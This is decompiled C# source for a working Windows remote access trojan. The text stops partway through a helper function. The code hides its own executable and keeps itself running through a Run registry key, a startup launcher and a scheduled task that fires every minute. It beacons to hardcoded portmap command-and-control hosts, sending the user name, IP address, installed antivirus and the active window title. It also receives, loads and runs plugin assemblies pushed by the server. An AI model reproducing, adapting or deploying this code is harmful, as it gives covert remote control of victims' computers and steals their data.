using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Nuclear_Explosion;

public class Atomic
{
	public bool OW;

	public TcpClient C;

	public bool Cn;

	public Thread SC;

	public Thread PT;

	public Thread INST;

	public int I;

	public int MS;

	public string[] Hosts;

	public string[] Ports;

	public string ID;

	public string MUTEX;

	public int H;

	public int P;

	public static string SPL;

	public static string App;

	public static Atomic SCG;

	public static ComputerInfo DI;

	public static string Key;

	public static Mutex MT;

	static Atomic()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		Class2.eylYmM7ztDwpf();
		SPL = "*-]NK[-*";
		App = Application.get_ExecutablePath();
		SCG = new Atomic();
		DI = new ComputerInfo();
		Key = "4859";
	}

	public Atomic()
	{
		Class2.eylYmM7ztDwpf();
		base._002Ector();
		OW = false;
		C = null;
		Cn = false;
		SC = new Thread(MAC, 1);
		PT = new Thread(Pin);
		INST = new Thread(INS);
		I = 1;
		MS = 0;
		Hosts = Strings.Split("DarkVader94-36189.portmap.host,DestroyerGod31-35654.portmap.io,cloverbeats-35767.portmap.io,lanzopunch-45369.portmap.host,ZeldorisPiety-50433.portmap.host,", ",", -1, (CompareMethod)0);
		Ports = Strings.Split("36189,35654,35767,45369,50433,", ",", -1, (CompareMethod)0);
		ID = "T2ZmaWNl";
		MUTEX = "RV_MUTEX-pawrHJfWfhaRCl";
		H = 0;
		P = 0;
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			File.SetAttributes(App, FileAttributes.Hidden | FileAttributes.System);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		SCG.Execute();
	}

	public void Execute()
	{
		NewLateBinding.LateCall((object)SC, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		PT.Start();
		INST.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void INS()
	{
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		try
		{
			Process.GetCurrentProcess().PriorityClass = (ProcessPriorityClass)Conversions.ToInteger("16384");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			MT = new Mutex(initiallyOwned: true, MUTEX, out OW);
			if (!OW)
			{
				ProjectData.EndApp();
				Application.add_ApplicationExit((EventHandler)delegate
				{
					((VB_0024AnonymousDelegate_0)delegate
					{
						MT.ReleaseMutex();
					})();
				});
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(35000);
		string empty = string.Empty;
		try
		{
			empty = Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger("26")) + "\\TexTInput.exe";
			File.Copy(App, empty, overwrite: true);
			Process.Start(empty);
			ProjectData.EndApp();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			ICodeCompiler obj = new VBCodeProvider().CreateCompiler();
			CompilerParameters val = new CompilerParameters();
			val.set_CompilerOptions("/target:winexe");
			val.set_OutputAssembly(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\TextInputh.exe");
			obj.CompileAssemblyFromSource(val, "Module WZwfRt\r\nSub Main()\r\nTry\r\nSystem.Diagnostics.Process.Start(\"" + "%Path%".Replace("%Path%", App) + "\")\r\nCatch : End Try\r\nEnd Sub\r\nEnd Module");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			IR("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TextInput", App);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("schtasks /create /sc minute /mo 1 /tn \"Text Input Module for Windows\" /tr \"" + App + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread = new Thread(RGPR);
			thread.Start();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	public void RGPR()
	{
		while (true)
		{
			Thread.Sleep(10000);
			if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TextInput", null) == null)
			{
				IR("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TextInput", App);
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TextInput", null), (object)App, false))))
			{
				IR("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TextInput", App);
			}
		}
	}

	public void Pin()
	{
		checked
		{
			while (true)
			{
				if (I == 0)
				{
					MS++;
				}
				Thread.Sleep(1);
			}
		}
	}

	public void data(byte[] b)
	{
		string[] array = Strings.Split(BS(b), Key, -1, (CompareMethod)0);
		if (Operators.CompareString(array[0], "PNC", false) == 0)
		{
			I = 0;
			Send("PNC");
		}
		else if (Operators.CompareString(array[0], "P", false) == 0)
		{
			I = 1;
			Send("P" + Key + Conversions.ToString(MS));
			MS = 0;
			Send("W" + Key + GAW());
		}
		else if (Operators.CompareString(array[0], "IE", false) == 0)
		{
			if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Software\\", Encode(MUTEX)), (object)"\\"), (object)array[1])), writable: true) != null)
			{
				try
				{
					INV(Hosts[H], Ports[P], array[4], array[5], Conversions.ToString(Encode(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Decode(ID), (object)"_"), (object)HWD())))), Registry.GetValue(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_CURRENT_USER\\SOFTWARE\\", Encode(MUTEX)), (object)"\\"), (object)array[1])), array[1], null)!.ToString(), Conversions.ToInteger(array[2]), Conversions.ToBoolean(array[3]), array[1], B: true);
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Send("GPL" + Key + array[5] + Key + array[1] + Key + Conversions.ToString(false));
					ProjectData.ClearProjectError();
					return;
				}
			}
			Send("GPL" + Key + array[5] + Key + array[1] + Key + Conversions.ToString(false));
		}
		else if (Operators.CompareString(array[0], "LP", false) == 0)
		{
			INV(Hosts[H], Ports[P], array[1], array[2], Conversions.ToString(Encode(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Decode(ID), (object)"_"), (object)HWD())))), array[3], Conversions.ToInteger(array[4]), Conversions.ToBoolean(array[5]), array[6], Conversions.ToBoolean(array[7]));
		}
		else if (Operators.CompareString(array[0], "UNV", false) == 0)
		{
			object obj = LA(array[1]);
			object[] array2 = new object[1];
			ref string reference = ref array[2];
			array2[0] = reference;
			object[] array3 = array2;
			bool[] obj2 = new bool[1] { true };
			bool[] array4 = obj2;
			object obj3 = NewLateBinding.LateGet(obj, (Type)null, "CreateInstance", array2, (string[])null, (Type[])null, obj2);
			if (array4[0])
			{
				reference = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array3[0]), typeof(string));
			}
			object[] array5 = new object[43];
			array5[0] = Encode(MUTEX);
			ref string reference2 = ref array[3];
			array5[1] = reference2;
			array5[2] = "True";
			array5[3] = "26";
			array5[4] = "TexTInput.exe";
			array5[5] = "True";
			array5[6] = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
			array5[7] = "TextInput";
			array5[8] = "True";
			array5[9] = "Text Input Module for Windows";
			array5[10] = "";
			array5[11] = "";
			array5[12] = "";
			array5[13] = "";
			array5[14] = "";
			array5[15] = "";
			array5[16] = "";
			array5[17] = "";
			array5[18] = "";
			array5[19] = "";
			array5[20] = "";
			array5[21] = "";
			array5[22] = "";
			array5[23] = "";
			array5[24] = "";
			array5[25] = "True";
			array5[26] = "TextInputh.exe";
			ref string reference3 = ref array[4];
			array5[32] = reference3;
			ref string reference4 = ref array[5];
			array5[33] = reference4;
			array5[34] = App;
			ref string reference5 = ref array[6];
			array5[35] = reference5;
			ref string reference6 = ref array[7];
			array5[36] = reference6;
			ref string reference7 = ref array[8];
			array5[37] = reference7;
			ref string reference8 = ref array[9];
			array5[38] = reference8;
			ref string reference9 = ref array[10];
			array5[39] = reference9;
			ref string reference10 = ref array[11];
			array5[40] = reference10;
			ref string reference11 = ref array[12];
			array5[41] = reference11;
			ref string reference12 = ref array[13];
			array5[42] = reference12;
			object[] array6 = array5;
			bool[] array7;
			NewLateBinding.LateCall(obj3, (Type)null, "UNI", array5, (string[])null, (Type[])null, array7 = new bool[43]
			{
				false, true, false, false, false, false, false, false, false, false,
				false, false, false, false, false, false, false, false, false, false,
				false, false, false, false, false, false, false, false, false, false,
				false, false, true, true, true, true, true, true, true, true,
				true, true, true
			}, true);
			if (array7[1])
			{
				reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[1]), typeof(string));
			}
			if (array7[32])
			{
				reference3 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[32]), typeof(string));
			}
			if (array7[33])
			{
				reference4 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[33]), typeof(string));
			}
			if (array7[34])
			{
				App = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[34]), typeof(string));
			}
			if (array7[35])
			{
				reference5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[35]), typeof(string));
			}
			if (array7[36])
			{
				reference6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[36]), typeof(string));
			}
			if (array7[37])
			{
				reference7 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[37]), typeof(string));
			}
			if (array7[38])
			{
				reference8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[38]), typeof(string));
			}
			if (array7[39])
			{
				reference9 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[39]), typeof(string));
			}
			if (array7[40])
			{
				reference10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[40]), typeof(string));
			}
			if (array7[41])
			{
				reference11 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[41]), typeof(string));
			}
			if (array7[42])
			{
				reference12 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array6[42]), typeof(string));
			}
		}
	}

	public object INV(string H, string P, string N, string C, string ID, string Bytes, int S, bool M, string MD5, bool B)
	{
		object obj = NewLateBinding.LateGet(LA(Bytes), (Type)null, "CreateInstance", new object[2]
		{
			N + "." + C,
			true
		}, (string[])null, (Type[])null, (bool[])null);
		object[] obj2 = new object[6] { ID, S, H, P, Key, SPL };
		object[] array = obj2;
		bool[] obj3 = new bool[6] { true, true, true, true, true, true };
		bool[] array2 = obj3;
		NewLateBinding.LateCall(obj, (Type)null, "Start", obj2, (string[])null, (Type[])null, obj3, true);
		if (array2[0])
		{
			ID = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
		}
		if (array2[1])
		{
			S = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(int));
		}
		if (array2[2])
		{
			H = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[2]), typeof(string));
		}
		if (array2[3])
		{
			P = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[3]), typeof(string));
		}
		if (array2[4])
		{
			Key = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[4]), typeof(string));
		}
		if (array2[5])
		{
			SPL = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[5]), typeof(string));
		}
		if (M)
		{
			try
			{
				if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"Software\\", Encode(MUTEX)), (object)"\\"), (object)MD5)), writable: true) == null)
				{
					IR(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_CURRENT_USER\\SOFTWARE\\", Encode(MUTEX)), (object)"\\"), (object)MD5)), MD5, Bytes);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (!B)
			{
				IR(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"HKEY_CURRENT_USER\\SOFTWARE\\", Encode(MUTEX)), (object)"\\"), (object)MD5)), MD5, Bytes);
			}
		}
		object result = default(object);
		return result;
	}

	public object LA(string B)
	{
		return Assembly.Load(Decompress(Convert.FromBase64String(B)));
	}

	public object IR(string P, string N, string B)
	{
		object result = default(object);
		try
		{
			Registry.SetValue(P, N, B);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void MAC()
	{
		object obj = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					try
					{
						EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (C != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Connected", new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && Cn)
					{
						num++;
						if (num <= 150)
						{
							goto IL_013b;
						}
						num = 0;
						if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
						{
							-1,
							SelectMode.SelectRead
						}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
						{
							goto IL_013b;
						}
					}
					goto end_IL_003c;
					IL_013b:
					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet((object)C, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet((object)C, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
						object obj2 = NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] obj3 = new object[4]
						{
							array,
							0,
							array.Length,
							SocketFlags.None
						};
						object[] array2 = obj3;
						bool[] obj4 = new bool[4] { true, false, false, false };
						bool[] array3 = obj4;
						NewLateBinding.LateCall(obj2, (Type)null, "Receive", obj3, (string[])null, (Type[])null, obj4, true);
						if (array3[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						NewLateBinding.LateCall(obj, (Type)null, "Write", array2 = new object[3] { array, 0, array.Length }, (string[])null, (Type[])null, array3 = new bool[3] { true, false, false }, true);
						if (array3[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						while (BS((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null)).Contains(SPL))
						{
							Array array4 = fx((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), SPL);
							Thread thread = new Thread(delegate(object a0)
							{
								data((byte[])a0);
							});
							thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array4, new object[1] { 0 }, (string[])null)));
							NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
							obj = new MemoryStream();
							if (array4.Length == 2)
							{
								object obj5 = obj;
								object[] array5 = new object[3];
								Array array6 = array4;
								object[] array7 = new object[1];
								object obj6 = (array7[0] = 1);
								array5[0] = NewLateBinding.LateIndexGet((object)array6, array7, (string[])null);
								array5[1] = 0;
								object obj7;
								array5[2] = NewLateBinding.LateGet(obj7 = NewLateBinding.LateIndexGet((object)array4, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null);
								array2 = array5;
								NewLateBinding.LateCall(obj5, (Type)null, "Write", array5, (string[])null, (Type[])null, array3 = new bool[3] { true, false, true }, true);
								if (array3[0])
								{
									NewLateBinding.LateIndexSetComplex((object)array6, new object[2]
									{
										obj6,
										array2[0]
									}, (string[])null, true, false);
								}
								if (array3[2])
								{
									NewLateBinding.LateSetComplex(obj7, (Type)null, "length", new object[1] { array2[2] }, (string[])null, (Type[])null, true, true);
								}
								continue;
							}
							break;
						}
					}
					goto IL_0413;
					end_IL_003c:;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					try
					{
						try
						{
							EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					Cn = false;
					try
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Disconnect", new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					try
					{
						NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					obj = new MemoryStream();
					bool flag = false;
					int num2 = Hosts.Length - 2;
					for (int i = 0; i <= num2; i++)
					{
						try
						{
							C = new TcpClient
							{
								ReceiveTimeout = -1,
								SendTimeout = -1,
								SendBufferSize = 999999,
								ReceiveBufferSize = 999999
							};
							num = 0;
							object obj8 = CK();
							object[] array8 = new object[2];
							ref string reference = ref Hosts[i];
							array8[0] = reference;
							ref string reference2 = ref Ports[i];
							array8[1] = reference2;
							object[] array2 = array8;
							bool[] obj9 = new bool[2] { true, true };
							bool[] array3 = obj9;
							NewLateBinding.LateCall(obj8, (Type)null, "Connect", array8, (string[])null, (Type[])null, obj9, true);
							if (array3[0])
							{
								reference = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
							}
							if (array3[1])
							{
								reference2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
							}
							Cn = true;
							NewLateBinding.LateCall((object)this, (Type)null, "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Information" + Key + ID + Key), Encode("_" + HWD())), (object)Key), IP()), (object)Key), Encode(Environment.MachineName + " / " + Environment.UserName)), (object)Key), (object)CIVC()), (object)Key), Encode(DI.get_OSFullName() + " " + OP())), (object)Key), Encode(Conversions.ToString(MP()))), (object)Key), (object)DI.get_TotalPhysicalMemory()), (object)Key), (object)GetProduct("Select * from AntiVirusProduct")), (object)Key), (object)GetProduct("SELECT * FROM FirewallProduct")), (object)Key), (object)Ports[P]), (object)Key), (object)GAW()), (object)Key), Encode(CultureInfo.CurrentCulture.Name)), (object)Key), (object)"False") }, (string[])null, (Type[])null, (bool[])null, true);
							H = i;
							P = i;
							flag = true;
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							Thread.Sleep(Conversions.ToInteger("3000"));
							H = 0;
							P = 0;
							ProjectData.ClearProjectError();
							continue;
						}
						goto end_IL_041e;
					}
					if (!flag)
					{
						break;
					}
					flag = false;
					continue;
					end_IL_041e:
					break;
				}
				continue;
				IL_0413:
				Thread.Sleep(1);
			}
		}
	}

	public object CK()
	{
		return NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
	}

	public void Send(byte[] b)
	{
		if (!Cn)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] obj2 = new object[3] { b, 0, b.Length };
			object[] array = obj2;
			bool[] obj3 = new bool[3] { true, false, false };
			bool[] array2 = obj3;
			NewLateBinding.LateCall(obj, (Type)null, "Write", obj2, (string[])null, (Type[])null, obj3, true);
			if (array2[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				SB(SPL),
				0,
				SPL.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SendBufferSize", new object[1] { b.Length }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Poll", new object[2]
			{
				-1,
				SelectMode.SelectWrite
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj4 = NewLateBinding.LateGet((object)C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array3 = new object[4];
			object obj5 = obj;
			array3[0] = NewLateBinding.LateGet(obj5, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
			array3[1] = 0;
			object obj6 = obj;
			array3[2] = NewLateBinding.LateGet(obj6, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null);
			array3[3] = SocketFlags.None;
			array = array3;
			NewLateBinding.LateCall(obj4, (Type)null, "Send", array3, (string[])null, (Type[])null, array2 = new bool[4] { true, false, true, false }, true);
			if (array2[0])
			{
				NewLateBinding.LateSetComplex(obj5, (Type)null, "ToArray", new object[1] { array[0] }, (string[])null, (Type[])null, true, false);
			}
			if (array2[2])
			{
				NewLateBinding.LateSetComplex(obj6, (Type)null, "Length", new object[1] { array[2] }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Cn = false;
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string S)
	{
		Send(SB(S));
	}

	public object IP()
	{
		try
		{
			return ((IPAddress)Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "????";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_4);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_0);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	[DllImport("psapi")]
	public static extern bool EmptyWorkingSet(long hProcess);

	public string HWD()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string CIVC()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return "Yes";
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return "No";
		}
	}

	public static string OP()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					return Conversions.ToString(Convert.ToInt32(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val).get_Item("AddressWidth"))));
				}
				string result = default(string);
				return result;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "????";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string GetProduct(string Product)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(DI.get_OSFullName().Contains("XP"), (object)"", (object)"2").ToString(), Product).Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					text += ((ManagementBaseObject)val).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				return Conversions.ToString(Encode(text));
			}
			return Conversions.ToString(Encode("N/A"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = Conversions.ToString(Encode("N/A"));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object MP()
	{
		try
		{
			return Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null)!.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "????";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string GAW()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		GetWindowText(GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
		return Conversions.ToString(Encode(stringBuilder.ToString()));
	}

	public byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
